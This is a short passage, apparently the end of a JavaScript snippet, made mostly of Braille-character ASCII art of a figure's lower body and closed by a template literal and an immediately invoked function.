⠀⠀⠀⢀⠎⠀⢀⣴⣿⣿⣿⡇⣧⠀⠀⠀
⠀⢀⡔⠁⠀⢠⡟⢻⡻⣿⣿⣿⣌⡀⠀⠀
⢀⡎⠀⠀⠀⣼⠁⣼⣿⣦⠻⣿⣿⣷⡀⠀
⢸⠀⠀⠀⠀⡟⢰⣿⣿⡟⠀⠘⢿⣿⣷⡀
⠈⠳⠦⠴⠞⠀⢸⣿⣿⠁⠀⠀⠀⠹⣿⡧
⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⢰⣿⡇
⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇
⠀⠀⠀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⢸⣿⡇
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⣿⣆⠀⠀⠀⠀⠀⣿⣧
⠀⠀⠀⠀⠀⠀⠀⠏⢿⠄⠀⠀⠀⠐⢸⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
})();
